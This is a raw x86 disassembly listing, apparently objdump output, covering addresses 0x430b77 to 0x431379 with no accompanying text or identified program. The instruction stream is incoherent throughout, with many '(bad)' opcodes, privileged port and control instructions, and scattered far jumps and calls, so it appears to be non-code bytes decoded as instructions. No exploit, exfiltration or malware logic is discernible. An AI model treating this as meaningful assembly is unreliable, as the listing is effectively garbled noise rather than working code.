  430b77:	dec    ebp
  430b78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430b7e:	dec    ebp
  430b7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b85:	jge    0x430b55
  430b87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b8d:	add    cl,dh
  430b8f:	dec    ebp
  430b90:	dec    DWORD PTR [ebx-0x2c031b01]
  430b96:	inc    ebp
  430b97:	push   ebp
  430b98:	dec    DWORD PTR [ebx-0x73ff2734]
  430b9e:	lea    ebx,[ebx-0x7400cdac]
  430ba4:	push   eax
  430ba5:	mov    ah,0x45
  430ba7:	push   ebp
  430ba8:	mov    esi,DWORD PTR [ebx]
  430baa:	les    esi,FWORD PTR [ebx]
  430bac:	add    BYTE PTR [ebx],al
  430bae:	inc    DWORD PTR [ebx]
  430bb0:	mov    ecx,DWORD PTR [edi]
  430bb2:	cld    
  430bb3:	retf   0x4d80
  430bb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430bbc:	jne    0x430b49
  430bbe:	jmp    eax
  430bc0:	ror    bl,1
  430bc2:	or     cl,dh
  430bc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430bca:	not    bl
  430bcc:	adc    al,0xca
  430bce:	inc    ebp
  430bcf:	push   ebp
  430bd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430bd6:	push   0xaf80d6
  430bdb:	mov    eax,DWORD PTR [eax]
  430bdd:	in     al,0xff
  430bdf:	sti    
  430be0:	sbb    dh,cl
  430be2:	pop    esi
  430be3:	xchg   esp,eax
  430be4:	leave  
  430be5:	fwait
  430be6:	add    al,0x32
  430be8:	push   ebp
  430be9:	cmp    ebp,esp
  430beb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430bef:	dec    DWORD PTR [ecx-0x740f0375]
  430bf5:	push   ebp
  430bf6:	cld    
  430bf7:	xor    ebp,ebx
  430bf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430bff:	push   ebp
  430c00:	clc    
  430c01:	xor    esi,ecx
  430c03:	add    esi,DWORD PTR [ebp-0x75]
  430c06:	(bad)  
  430c07:	hlt    
  430c08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c0f:	mov    DWORD PTR [esi],eax
  430c11:	hlt    
  430c12:	(bad)  
  430c13:	dec    ebp
  430c14:	add    esi,DWORD PTR [ebx]
  430c16:	(bad)  
  430c17:	mov    edx,0xffc68d0a
  430c1c:	add    dl,cl
  430c1e:	leave  
  430c1f:	push   ebp
  430c20:	push   ebp
  430c21:	mov    ebp,esp
  430c23:	fcom   QWORD PTR [ecx+0x7d]
  430c26:	inc    ebp
  430c27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430c2d:	iret   
  430c2e:	cld    
  430c2f:	retf   0x868f
  430c32:	loopne 0x430c31
  430c34:	mov    edi,edi
  430c36:	mov    esi,DWORD PTR [ebp-0x8]
  430c39:	mov    esi,eax
  430c3b:	cld    
  430c3c:	jne    0x430bee
  430c3e:	mov    BYTE PTR [ecx],0xa
  430c41:	add    dh,al
  430c43:	test   DWORD PTR [eax],ecx
  430c45:	inc    esi
  430c47:	inc    DWORD PTR [edi]
  430c49:	mov    eax,esi
  430c4b:	cld    
  430c4c:	add    DWORD PTR [eax+0x901c6],eax
  430c52:	leave  
  430c53:	xor    BYTE PTR [ebp+0x45],dl
  430c56:	in     al,dx
  430c57:	mov    edx,DWORD PTR [ecx-0x40]
  430c5a:	inc    ebp
  430c5b:	add    BYTE PTR [ecx-0x74000301],cl
  430c61:	int3   
  430c62:	cld    
  430c63:	jne    0x430c1d
  430c65:	call   0xcc1f70
  430c6a:	mov    esi,DWORD PTR [ebp-0x8]
  430c6d:	test   eax,esi
  430c6f:	je     0x430ce6
  430c71:	mov    eax,esi
  430c73:	cld    
  430c74:	add    al,0x80
  430c76:	add    WORD PTR [ecx+0x0],ax
  430c7a:	fiadd  DWORD PTR [eax]
  430c7c:	mov    BYTE PTR [eax],0x3d
  430c7f:	push   0xffffffc3
  430c81:	push   esi
  430c82:	mov    edx,DWORD PTR [eax+0x51]
  430c85:	pop    edi
  430c86:	lea    ebx,[ebx-0x8]
  430c89:	ret    0x45
  430c8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c92:	xchg   eax,edi
  430c94:	mov    DWORD PTR [ebp-0x75],ecx
  430c97:	push   esi
  430c98:	clc    
  430c99:	jne    0x430c6b
  430c9b:	mov    ecx,0xf8450b0b
  430ca0:	(bad)  
  430ca1:	push   cs
  430ca2:	or     BYTE PTR [ebp-0x3a],dh
  430ca5:	cmp    eax,DWORD PTR [ecx]
  430ca7:	pop    esi
  430ca8:	(bad)  
  430ca9:	or     al,0x5
  430cab:	inc    eax
  430cac:	leave  
  430cad:	jmp    0x40cf:0x25564204
  430cb4:	leave  
  430cb5:	in     eax,dx
  430cb6:	inc    DWORD PTR [eax-0x75]
  430cb9:	fimul  DWORD PTR [ebx-0x228139be]
  430cbf:	inc    eax
  430cc0:	nop
  430cc1:	loopne 0x430cc2
  430cc3:	ret    
  430cc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430cca:	add    eax,0xff45e8f8
  430ccf:	push   esi
  430cd0:	push   DWORD PTR [ebp-0x39]
  430cd3:	mov    eax,0x7edda46
  430cd8:	or     al,0x6
  430cda:	push   DWORD PTR [ebp-0x3a]
  430cdd:	cmp    eax,DWORD PTR [edx]
  430cdf:	pop    esi
  430ce0:	ret    
  430ce1:	or     al,0x56
  430ce3:	inc    ecx
  430ce4:	push   ebp
  430ce5:	jle    0x430cd3
  430ce7:	inc    edx
  430ce8:	inc    ebp
  430ce9:	int    0x1
  430ceb:	inc    ecx
  430cec:	sub    BYTE PTR ds:0xe77541fc,ah
  430cf2:	add    DWORD PTR [edx+0x1c],eax
  430cf5:	retf   0xc38b
  430cf8:	adc    al,0x8b
  430cfa:	xchg   edx,eax
  430cfb:	push   ecx
  430cfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d02:	rcl    DWORD PTR [esi-0x9],cl
  430d05:	jne    0x430d57
  430d07:	mov    eax,0x7c80ece
  430d0c:	rol    DWORD PTR [esi],cl
  430d0e:	div    DWORD PTR [ebp+0x50]
  430d11:	cmp    ecx,edx
  430d13:	pop    esi
  430d14:	dec    BYTE PTR [edx]
  430d16:	in     al,dx
  430d17:	inc    edx
  430d18:	sub    esp,ecx
  430d1a:	inc    eax
  430d1b:	(bad)  
  430d1c:	push   eax
  430d1d:	add    edx,DWORD PTR [eax-0x1f]
  430d20:	push   edi
  430d21:	add    dh,dh
  430d23:	leave  
  430d24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430d28:	add    BYTE PTR [ecx+0x0],dl
  430d2b:	inc    ebp
  430d2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d32:	add    BYTE PTR [eax-0x7fbf448],bh
  430d38:	add    al,0x2
  430d3a:	jmp    0x57eb894
  430d3f:	jne    0x430d29
  430d41:	mov    eax,DWORD PTR [edx]
  430d43:	or     BYTE PTR [eax],al
  430d45:	inc    ecx
  430d46:	stc    
  430d47:	in     eax,dx
  430d48:	ss inc eax
  430d4a:	aas    
  430d4b:	out    0x7d,eax
  430d4d:	inc    ecx
  430d4e:	mov    ebp,ecx
  430d50:	lock ret 0x7d
  430d54:	and    ecx,DWORD PTR [ebx-0x171777]
  430d5a:	add    bh,bh
  430d5c:	aad    0xd7
  430d5e:	add    dh,cl
  430d60:	clts   
  430d62:	(bad)  
  430d63:	call   0xffce0c68
  430d68:	hlt    
  430d69:	iret   
  430d6a:	jge    0x430d42
  430d6c:	rol    DWORD PTR [esi-0x80],cl
  430d6f:	jmp    0x1c5c7c
  430d74:	out    dx,al
  430d75:	mov    eax,DWORD PTR [ebx]
  430d77:	(bad)  
  430d78:	pop    esi
  430d79:	push   es
  430d7a:	cmp    al,0xe8
  430d7c:	sar    edi,0x8
  430d7f:	inc    DWORD PTR [edi]
  430d81:	inc    esi
  430d82:	(bad)  
  430d83:	loopne 0x430e03
  430d85:	push   edi
  430d86:	push   cs
  430d87:	push   ebx
  430d88:	add    BYTE PTR [ebx+0x24008b56],cl
  430d8e:	add    BYTE PTR [ebp+0x50],al
  430d91:	push   eax
  430d92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d98:	sub    edx,DWORD PTR [esi-0x24]
  430d9b:	jne    0x430d53
  430d9d:	lods   eax,DWORD PTR ds:[esi]
  430d9e:	mov    edx,DWORD PTR [edx-0x34]
  430da1:	dec    esi
  430da2:	out    0x83,eax
  430da4:	into   
  430da5:	push   edi
  430da7:	loopne 0x430d77
  430da9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430dad:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430db4:	rol    DWORD PTR [edx],0x8
  430db7:	mov    esp,ecx
  430db9:	cmp    DWORD PTR [ebx],0xc
  430dbc:	mov    esi,0x5001c0
  430dc1:	push   eax
  430dc2:	push   cs
  430dc3:	push   eax
  430dc4:	(bad)  
  430dc5:	sub    edx,edi
  430dc7:	push   esi
  430dc8:	adc    al,0xcb
  430dca:	ins    DWORD PTR es:[edi],dx
  430dcb:	mov    eax,0x203e8
  430dd0:	add    al,ah
  430dd2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430dd9:	add    dh,al
  430ddb:	add    ah,ch
  430ddd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430de3:	pop    ecx
  430de4:	or     eax,ebx
  430de6:	cli    
  430de7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430ded:	lea    ebp,[ebx]
  430def:	mov    edx,DWORD PTR [edx-0x4]
  430df2:	dec    ecx
  430df3:	inc    ebp
  430df4:	shr    BYTE PTR [ebx],0x4b
  430df7:	and    al,0x0
  430df9:	(bad)  
  430dfa:	jne    0x430e41
  430dfc:	pop    eax
  430dfd:	mov    al,0x5a
  430dff:	call   0x142105e
  430e04:	and    al,0x85
  430e06:	push   edx
  430e07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e0b:	dec    ebp
  430e0c:	mov    cl,0x23
  430e0e:	jmp    0x430dfc
  430e10:	mov    al,0xe7
  430e12:	call   0x1391100
  430e17:	shr    DWORD PTR [eax+ebx*2],cl
  430e1a:	lock (bad) 
  430e1c:	adc    eax,0x757f008d
  430e21:	out    0x58,eax
  430e23:	cmp    al,0x7
  430e25:	pop    edx
  430e26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430e2d:	push   ecx
  430e2e:	cld    
  430e2f:	mov    esi,0x3b0175
  430e34:	and    al,0xb0
  430e36:	xor    BYTE PTR [edx+0x1],0x8b
  430e3a:	add    ah,bh
  430e3c:	mov    edi,DWORD PTR [ebp-0x4]
  430e3f:	psubsw mm7,QWORD PTR [edi]
  430e42:	add    DWORD PTR [ebp+0x0],ebp
  430e45:	rcr    eax,1
  430e47:	mov    edi,ecx
  430e49:	and    eax,DWORD PTR [eax]
  430e4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e51:	call   0x130113a
  430e56:	add    al,cl
  430e58:	mov    ebp,esi
  430e5a:	aam    0x83
  430e5c:	or     DWORD PTR [ecx],eax
  430e5e:	jne    0x430e51
  430e60:	mov    eax,DWORD PTR [eax]
  430e62:	aam    0x0
  430e64:	dec    ebp
  430e65:	jne    0x430df2
  430e67:	cmp    ebx,eax
  430e69:	jb     0x430eb8
  430e6b:	jmp    0x430df8
  430e6d:	mov    ebx,esp
  430e6f:	int3   
  430e70:	dec    ebp
  430e71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e78:	mov    edx,0x8b0a8b
  430e7d:	cmp    ecx,DWORD PTR [eax]
  430e7f:	jb     0x430e58
  430e81:	pop    edx
  430e82:	push   edi
  430e83:	cli    
  430e84:	pop    es
  430e85:	mov    eax,ecx
  430e87:	jb     0x430e8b
  430e89:	add    DWORD PTR [ebx],0xa
  430e8c:	mov    eax,DWORD PTR [ebx]
  430e8e:	int3   
  430e8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e95:	jmp    0x430e22
  430e97:	mov    al,0xe8
  430e99:	call   0x104111b
  430e9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430ea1:	pop    edi
  430ea2:	or     BYTE PTR [ecx-0x73],bl
  430ea5:	pop    ecx
  430ea6:	inc    edi
  430ea7:	xor    al,0xeb
  430ea9:	push   ecx
  430eaa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430eb0:	call   0xb20fb5
  430eb5:	int3   
  430eb6:	sbb    BYTE PTR [esi],ch
  430eb8:	inc    ebp
  430eb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430ebf:	call   0x9c112e
  430ec4:	or     BYTE PTR [ebx-0x73],dl
  430ec7:	cmp    al,0x47
  430ec9:	mov    al,0x1
  430ecb:	jb     0x430ecd
  430ecd:	mov    al,0x10
  430ecf:	push   eax
  430ed0:	add    al,0x75
  430ed2:	add    BYTE PTR [ebx],ch
  430ed4:	add    ebx,esp
  430ed6:	int3   
  430ed7:	jne    0x430ee9
  430ed9:	movsx  edx,cl
  430edc:	add    DWORD PTR [eax],eax
  430ede:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430ee5:	mov    gs,edi
  430ee7:	add    BYTE PTR [eax-0x50],ch
  430eea:	add    al,ch
  430eec:	mov    eax,DWORD PTR [ecx]
  430eee:	sub    eax,DWORD PTR [eax]
  430ef0:	jb     0x430f67
  430ef2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ef6:	jge    0x430ee0
  430ef8:	add    al,0x1
  430efa:	add    DWORD PTR [eax],0x0
  430efd:	jne    0x430eff
  430eff:	je     0x430f46
  430f01:	mov    eax,DWORD PTR [edi]
  430f03:	ror    BYTE PTR [ebp+0x4d],1
  430f06:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f0d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f13:	mov    DWORD PTR [ebx],ebp
  430f15:	fadd   DWORD PTR [eax+0x75]
  430f18:	inc    eax
  430f19:	pop    eax
  430f1a:	lea    ebx,[ecx+0x4f]
  430f1d:	push   0xb1000003
  430f22:	out    dx,eax
  430f23:	add    ebp,DWORD PTR [edx+edx*2]
  430f26:	add    BYTE PTR [ebx+ecx*4],bh
  430f29:	mov    ch,BYTE PTR [ebx]
  430f2b:	jb     0x430f9f
  430f2d:	add    al,0x89
  430f2f:	push   eax
  430f30:	call   0x842b5ca2
  430f35:	add    DWORD PTR [eax+eax*1],eax
  430f38:	jae    0x430f4e
  430f3a:	icebp  
  430f3b:	inc    ebp
  430f3c:	mov    eax,DWORD PTR gs:[ecx]
  430f3f:	int3   
  430f40:	out    dx,al
  430f41:	loopne 0x430f90
  430f43:	sub    eax,DWORD PTR [edx]
  430f45:	push   0xffffff83
  430f47:	pop    esi
  430f48:	push   cs
  430f49:	jl     0x430f64
  430f4b:	add    al,0xaf
  430f4d:	xor    eax,0x832b6d00
  430f52:	mov    eax,DWORD PTR [edx]
  430f54:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f5a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f60:	inc    ebp
  430f61:	shr    ebx,0x3
  430f64:	or     DWORD PTR [eax],0x4
  430f67:	push   0xffffffa5
  430f69:	pop    esi
  430f6a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f71:	jmp    0x430fd0
  430f73:	mov    edi,0xff0272
  430f78:	fdivr  QWORD PTR [ebp+0x5d]
  430f7b:	push   0x4e
  430f7d:	pop    ecx
  430f7e:	call   0x435383
  430f83:	mov    DWORD PTR [ebx],eax
  430f85:	in     al,0xc8
  430f87:	rol    BYTE PTR [ebp-0x75],0xc1
  430f8b:	call   0xad116c
  430f90:	pop    esi
  430f91:	enter  0xceff,0x8b
  430f95:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f99:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430fa0:	je     0x430fa2
  430fa2:	or     DWORD PTR [ebx-0x74183b24],eax
  430fa8:	jne    0x430f8e
  430faa:	jmp    0x430fa5
  430fac:	push   DWORD PTR [edx-0x24]
  430faf:	push   0x4d
  430fb1:	pop    ecx
  430fb2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430fb6:	jge    0x430fbe
  430fb8:	mov    eax,eax
  430fba:	sub    ebp,DWORD PTR [edx+0x24]
  430fbd:	pop    esi
  430fbe:	inc    ebp
  430fbf:	mov    esp,0x8b6077
  430fc4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430fca:	lods   al,BYTE PTR ds:[esi]
  430fcb:	add    BYTE PTR [ebx],bh
  430fcd:	enter  0xce73,0x49
  430fd1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fd9:	stc    
  430fda:	jge    0x43104e
  430fdc:	jnp    0xdd42934b
  430fe2:	call   0xc610b8
  430fe7:	fadd   st(0),st
  430fe9:	dec    esi
  430fea:	ins    BYTE PTR es:[edi],dx
  430feb:	stc    
  430fec:	cmp    al,0x73
  430fee:	push   ebp
  430fef:	mov    eax,0xf8028b
  430ff4:	jne    0x430fb7
  430ff6:	mov    esi,ecx
  430ff8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ffb:	add    edi,DWORD PTR [ebp-0x24]
  430ffe:	sub    esp,eax
  431000:	and    al,0x45
  431002:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431008:	sbb    al,0xee
  43100a:	pop    esi
  43100b:	call   0x83103b
  431010:	fsubr  st,st(3)
  431012:	sti    
  431013:	add    BYTE PTR gs:[ecx],bh
  431016:	add    eax,esp
  431018:	add    DWORD PTR [esi],eax
  43101a:	rol    DWORD PTR [ebp+0x8],0x29
  43101e:	mov    esp,eax
  431020:	clc    
  431021:	jne    0x431098
  431023:	mov    eax,0x8b0673
  431028:	loopne 0x43106f
  43102a:	loopne 0x430fb5
  43102c:	lods   al,BYTE PTR ds:[esi]
  43102d:	int3   
  43102e:	inc    ebp
  43102f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431033:	add    al,0xc3
  431035:	sub    ecx,DWORD PTR [ebp+0x47]
  431038:	(bad)  
  43103a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43103e:	add    eax,DWORD PTR [eax]
  431040:	call   0x644d145
  431045:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43104b:	dec    esi
  43104c:	ins    DWORD PTR es:[edi],dx
  43104d:	in     al,dx
  43104e:	lea    eax,[eax]
  431050:	inc    ebp
  431051:	inc    ebp
  431052:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431058:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431062:	and    al,0xdc
  431064:	ror    DWORD PTR [edx+0x24],0xf7
  431068:	or     BYTE PTR [ebp+0x4c],dh
  43106b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43106f:	stos   BYTE PTR es:[edi],al
  431070:	adc    edx,edi
  431072:	inc    esp
  431073:	add    edi,DWORD PTR [eax]
  431075:	jne    0x43105a
  431077:	mov    DWORD PTR [eax-0x7449db04],ecx
  43107d:	cmp    ecx,DWORD PTR [edi]
  43107f:	sub    BYTE PTR [ebp-0x7e],dl
  431082:	sar    ebp,0xb
  431085:	jmp    FWORD PTR [edi+0x2400392a]
  43108b:	sub    esi,DWORD PTR [ebx-0x73]
  43108e:	mov    esp,DWORD PTR [ecx+edi*4]
  431091:	mov    ecx,DWORD PTR [eax]
  431093:	and    BYTE PTR [eax],al
  431095:	jne    0x431061
  431097:	sub    ebp,ecx
  431099:	sbb    BYTE PTR [esi+0x32],ah
  43109c:	dec    ebp
  43109d:	push   ebp
  43109e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4310a4:	ret    
  4310a5:	mov    edx,ebp
  4310a7:	leave  
  4310a8:	sub    DWORD PTR [esi+0x24],ebx
  4310ab:	ret    0x2b
  4310ae:	pop    ax
  4310b0:	push   ebp
  4310b1:	rol    BYTE PTR [ebx],0xeb
  4310b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4310bb:	jb     0x431112
  4310bd:	ret    
  4310be:	in     al,dx
  4310bf:	jecxz  0x43104c
  4310c1:	push   esi
  4310c2:	xchg   esp,eax
  4310c3:	jne    0x4310c5
  4310c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4310c8:	jne    0x4310ae
  4310ca:	mov    eax,DWORD PTR [ebp-0x77]
  4310cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310d4:	mov    esi,DWORD PTR [ebp-0x75]
  4310d7:	pop    esi
  4310d8:	nop
  4310d9:	mov    eax,DWORD PTR [eax]
  4310db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310e1:	add    al,0x0
  4310e3:	inc    ebp
  4310e4:	mov    eax,DWORD PTR [ebx]
  4310e6:	mov    ebp,ebx
  4310e8:	cmp    al,0xf
  4310ea:	or     al,al
  4310ec:	inc    ebp
  4310ed:	inc    ebp
  4310ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4310f4:	cld    
  4310f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4310fb:	add    BYTE PTR [ecx-0x5],dl
  4310fe:	add    eax,0x17200
  431103:	sbb    al,0x85
  431105:	dec    esp
  431106:	je     0x431140
  431108:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43110c:	add    BYTE PTR [ebx],bh
  43110e:	(bad)  
  43110f:	and    al,0x32
  431111:	jae    0x4310af
  431113:	mov    cl,cl
  431115:	inc    DWORD PTR [esp]
  431118:	push   ebp
  431119:	shr    esp,0x8
  43111c:	in     al,dx
  43111d:	push   esp
  43111e:	add    DWORD PTR [eax],esp
  431120:	add    bl,cl
  431122:	inc    ebp
  431123:	mov    bh,0x89
  431125:	add    ah,bh
  431127:	jmp    0xca752071
  43112c:	pushf  
  43112d:	dec    esp
  43112e:	mov    edx,0xf8178520
  431133:	fst    DWORD PTR [ebp+0x0]
  431136:	mov    BYTE PTR [eax],0xc4
  431139:	sub    edx,DWORD PTR [ebx-0x3f]
  43113c:	inc    ebp
  43113d:	add    eax,0xc601da
  431142:	mov    al,0xc6
  431145:	ins    BYTE PTR es:[edi],dx
  431146:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43114d:	dec    esp
  43114e:	jmp    DWORD PTR [eax]
  431150:	inc    ebp
  431151:	fnstcw WORD PTR [esi+0x29]
  431154:	test   BYTE PTR [eax],0xc8
  431157:	rol    BYTE PTR [eax],0xc0
  43115a:	lea    ecx,[ebp-0x3cf0dbcb]
  431160:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431166:	inc    esi
  431167:	add    DWORD PTR [eax],ebx
  431169:	add    dh,bh
  43116b:	mov    esi,DWORD PTR [edx+0x8]
  43116e:	(bad)  
  43116f:	fdiv   QWORD PTR ss:[ecx]
  431172:	(bad)  
  431173:	mov    bl,ch
  431175:	add    esi,eax
  431177:	add    dh,bl
  431179:	or     esi,eax
  43117b:	mov    dl,0xdf
  43117d:	add    esi,eax
  43117f:	add    al,ah
  431181:	push   cs
  431182:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431189:	or     BYTE PTR [ebx],dh
  43118b:	dec    ecx
  43118c:	lea    eax,[ebx]
  43118e:	xor    eax,0x18fc0fc7
  431193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431194:	repz clc 
  431196:	add    eax,DWORD PTR [ebp+0x46]
  431199:	prefetcht0 BYTE PTR [ecx-0x2]
  43119d:	xor    eax,0x7c60872
  4311a2:	mov    esp,0xbd32c69b
  4311a7:	pop    esi
  4311a8:	mov    cl,0xbe
  4311ab:	or     al,0xc6
  4311ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4311b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4311bb:	add    dh,al
  4311bd:	mov    eax,ebx
  4311bf:	xor    DWORD PTR [ebx],0x35008dbc
  4311c5:	mov    ecx,DWORD PTR [edi]
  4311c7:	sbb    al,0x18
  4311c9:	inc    ebp
  4311ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4311d1:	clc    
  4311d2:	(bad)  
  4311d3:	xor    DWORD PTR [edx-0x64],esi
  4311d6:	lea    ecx,[ecx+0x45ffe838]
  4311dc:	mov    ecx,ebx
  4311de:	fadd   st,st(6)
  4311e0:	dec    ebp
  4311e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4311e7:	out    0x1,eax
  4311e9:	inc    ebp
  4311ea:	lea    ebp,ds:0xc8ffc6ff
  4311f0:	enter  0xa33,0xc6
  4311f4:	push   ebp
  4311f5:	leave  
  4311f6:	(bad)  
  4311f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4311fd:	add    BYTE PTR [ebp+0x44],al
  431200:	mov    eax,esp
  431202:	mov    WORD PTR [esi+0x46398300],?
  431208:	psubusw mm4,QWORD PTR [esi-0x78]
  43120c:	add    BYTE PTR [ebx-0x1303f975],al
  431212:	add    BYTE PTR [ebp+0x1],0xeb
  431216:	add    BYTE PTR [ebp+0x38],al
  431219:	in     eax,dx
  43121a:	inc    ebp
  43121b:	inc    ebp
  43121c:	mov    ebx,ebx
  43121e:	add    BYTE PTR [ebp+0x0],0xec
  431222:	mov    DWORD PTR [ebp-0x41],eax
  431225:	sub    eax,0x2c00454e
  43122a:	ins    DWORD PTR es:[edi],dx
  43122b:	inc    ebp
  43122c:	add    BYTE PTR [esi+0x66],bh
  43122f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431236:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431240:	dec    edi
  431241:	pop    es
  431242:	add    ah,ch
  431244:	mov    DWORD PTR [ebp+0x68],eax
  431247:	in     eax,dx
  431248:	inc    DWORD PTR [ebp-0x7d]
  43124b:	out    0xc0,al
  43124d:	inc    ebp
  43124e:	mov    edx,esp
  431250:	push   0x45
  431252:	(bad)  
  431253:	jmp    0xdf925810
  431258:	add    BYTE PTR [ebp-0x77],al
  43125b:	out    dx,al
  43125c:	ins    BYTE PTR es:[edi],dx
  43125d:	inc    ebp
  43125e:	jmp    edi
  431260:	add    DWORD PTR [ebp-0x14],0x7e
  431264:	mov    esi,esi
  431266:	outs   dx,BYTE PTR ds:[esi]
  431267:	inc    esp
  431268:	(bad)  
  431269:	mov    esp,0x8341b68d
  43126e:	mov    DWORD PTR [esi+0x70],eax
  431271:	fcos   
  431273:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431279:	in     al,dx
  43127a:	jb     0x431201
  43127c:	(bad)  
  43127d:	dec    DWORD PTR [ebx-0x7aba9901]
  431283:	mov    edi,edi
  431285:	fdivr  st,st(7)
  431287:	out    dx,eax
  431288:	rcl    BYTE PTR [ebx],0x66
  43128b:	mov    DWORD PTR [ebp-0xc70075],eax
  431291:	(bad)  
  431292:	std    
  431293:	cmp    eax,DWORD PTR [eax]
  431295:	jne    0x4312fd
  431297:	mov    DWORD PTR [ebp-0xba0048],eax
  43129d:	in     al,dx
  43129e:	outs   dx,BYTE PTR ds:[esi]
  43129f:	pushf  
  4312a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4312a6:	inc    DWORD PTR [ecx]
  4312a8:	inc    DWORD PTR [eax]
  4312aa:	jae    0x4312e4
  4312ac:	add    BYTE PTR [ebp+0x850266],al
  4312b2:	inc    DWORD PTR [ebp-0x1]
  4312b5:	mov    eax,eax
  4312b7:	jl     0x43131f
  4312b9:	add    BYTE PTR [ebp-0x740077],al
  4312bf:	cld    
  4312c0:	dec    eax
  4312c1:	add    BYTE PTR [eax],0x1
  4312c4:	data16 add BYTE PTR [ebp+0x38],al
  4312c8:	mov    eax,0x47c2
  4312cd:	mov    eax,0x824f89
  4312d2:	inc    edi
  4312d3:	mov    DWORD PTR [edx+0x64],ebp
  4312d6:	inc    WORD PTR [ebp-0x75]
  4312da:	(bad)  
  4312db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4312e2:	inc    ebp
  4312e3:	jge    0x4312c4
  4312e5:	add    bh,ah
  4312e7:	lea    ax,[ebp-0x750030]
  4312ee:	add    al,0x46
  4312f1:	jmp    0x40ff:0x8885
  4312f7:	push   DWORD PTR [ebp+0x52]
  4312fa:	lea    eax,[eax]
  4312fc:	shl    BYTE PTR [esi-0x7b],1
  4312ff:	test   esi,edi
  431301:	(bad)  
  431302:	(bad)  
  431303:	inc    DWORD PTR [ebp-0x990140]
  431309:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43130f:	inc    edi
  431310:	push   ecx
  431311:	xor    ax,WORD PTR [ebp-0x8d0045]
  431318:	add    al,al
  43131a:	ret    
  43131b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431322:	push   eax
  431323:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43132a:	add    BYTE PTR [ebx-0x764f8839],al
  431330:	push   DWORD PTR [esi+0x1]
  431333:	inc    DWORD PTR [eax]
  431335:	mov    eax,0xff99ff
  43133a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431340:	jne    0x4312fa
  431342:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43134c:	mov    ecx,0xd74fb8
  431351:	add    cl,al
  431353:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431359:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431360:	(bad)  
  431361:	push   ebp
  431363:	mov    eax,0x8c2789
  431368:	ret    0x6689
  43136b:	adc    BYTE PTR [ebp+0x48],0x8d
  43136f:	add    bh,ah
  431371:	mov    WORD PTR [ebp-0x70],ax
  431375:	(bad)  
  431376:	ret    0x667d
  431379:	or     BYTE PTR [ebp-0x77],dl
